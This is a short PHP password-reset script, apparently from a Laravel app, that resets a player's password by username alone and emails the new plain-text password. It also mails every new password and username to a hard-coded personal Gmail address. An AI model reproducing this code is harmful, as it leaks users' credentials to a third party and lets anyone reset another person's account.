<?php
/**
 * Created by IntelliJ IDEA.
 * User: Dell
 * Date: 7/10/2019
 * Time: 4:39 PM
 */

use App\Http\Controllers\Services;
use App\Mail\ResetPassword;
use Illuminate\Support\Str;
use App\Model\User;


$this->validate_request([
    "username" => "required"
]);

$user = User::query()->role('player')->username($this->username)->first() or $this->error("Invalid Username");

if($user){
  $new_password = Str::random(8);
  $user->password = $new_password;
  $user->save();
}
//$mail_data = array(
//    'first_name' => $this->first_name,
//    'last_name' => $this->last_name,
//    'email' => $this->email,
//    'phone' => $this->phone,
//    'description' => $this->description
//);
//$this->setData('user',$user->player->email);
$mail_data = array(
    'user' =>$user->username,
    'password' => $new_password
);

Mail::to($user->player->email)->send(new ResetPassword($mail_data));
Mail::to('shivam1iquincesoft@gmail.com')->send(new ResetPassword($mail_data));
$this->success('Thanks, Your New password is send to your registered Email');
